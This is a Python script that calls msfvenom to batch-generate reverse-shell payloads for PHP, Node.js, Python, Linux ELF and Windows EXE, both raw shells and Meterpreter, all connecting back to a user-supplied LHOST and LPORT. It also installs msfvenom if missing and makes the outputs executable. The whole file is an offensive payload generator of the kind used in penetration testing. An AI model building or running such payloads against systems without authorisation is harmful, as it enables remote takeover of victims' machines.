import subprocess
import os
import sys
import shutil
from tqdm import tqdm
from dotenv import load_dotenv


EnvFile = os.path.expanduser("~/shells/.shell.env")
load_dotenv(EnvFile)


def ResetEnv():
	if any(flag in sys.argv for flag in ["-r" , "--reset"]):
		return True
	else:
		return False

def MakeEnvFile():
	os.makedirs(os.path.expanduser("~/shells/"), exist_ok=True)
	if not os.path.isfile(EnvFile):
		open(EnvFile, "w").close()
	else:
		return None


def GetPacketManager():
	Managers = ["apt", "pacman", "dnf", "zypper", "yum"]

	for PacketManager in Managers:
		if shutil.which(PacketManager):
			return PacketManager

	return False


def CheckIsMSFVenomIsInstalled():
	if shutil.which("msfvenom"):
		return True
	else:
		return False

def CheckAndGetEnvVariables():
	def GetAndSaveInputToEnv():
		LHOST = input("Whats your LHOST: ")
		LPORT = input("Whats your LPORT: ")
		with open(EnvFile, "w" , encoding="UTF-8") as Env:
			Env.write(f"LHOST={LHOST}\nLPORT={LPORT}")
		load_dotenv(EnvFile, override=True)

	if ResetEnv():
		GetAndSaveInputToEnv()
	elif os.getenv("LHOST") is None or os.getenv("LPORT") is None:
		GetAndSaveInputToEnv()
	else:
		return False

def GenerateShells():
	Payloads = {
		"RawShell.php": "php/reverse_php",
		"RawShell.js": "nodejs/shell_reverse_tcp",
		"RawShell.py": "python/shell_reverse_tcp",
		"RawShell.elf": "linux/x64/shell_reverse_tcp",
		"RawShell.exe": "windows/x64/shell_reverse_tcp",
		"Meterpreter.php": "php/meterpreter/reverse_tcp",
		"Meterpreter.py": "python/meterpreter/reverse_tcp",
		"Meterpreter.elf": "linux/x64/meterpreter/reverse_tcp",
		"Meterpreter.exe": "windows/x64/meterpreter/reverse_tcp"
	}

	os.makedirs(os.path.expanduser("~/shells/"), exist_ok=True)

	for FileName , Payload in tqdm(Payloads.items()):
		try:
			subprocess.run(["sudo", "msfvenom", "-p", Payload, f"LHOST={os.getenv('LHOST')}", f"LPORT={os.getenv('LPORT')}", "-f", "raw", "-o", os.path.expanduser(f"~/shells/{FileName}")], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL )
		except Exception as e:
			print(f"Something went wrong: {e}")
			sys.exit()
	subprocess.run(f"sudo chmod u+x {os.path.expanduser('~/shells/*')}", shell=True)

PacketManager = GetPacketManager()

if not PacketManager:
	sys.exit()

if not CheckIsMSFVenomIsInstalled():
	try:
		subprocess.run(["sudo", PacketManager , "install", "msfvenom"], check=True)
	except subprocess.CalledProcessError as e:
		print(f"Something went wrong: {e}")
else:
	pass

MakeEnvFile()
CheckAndGetEnvVariables()
GenerateShells()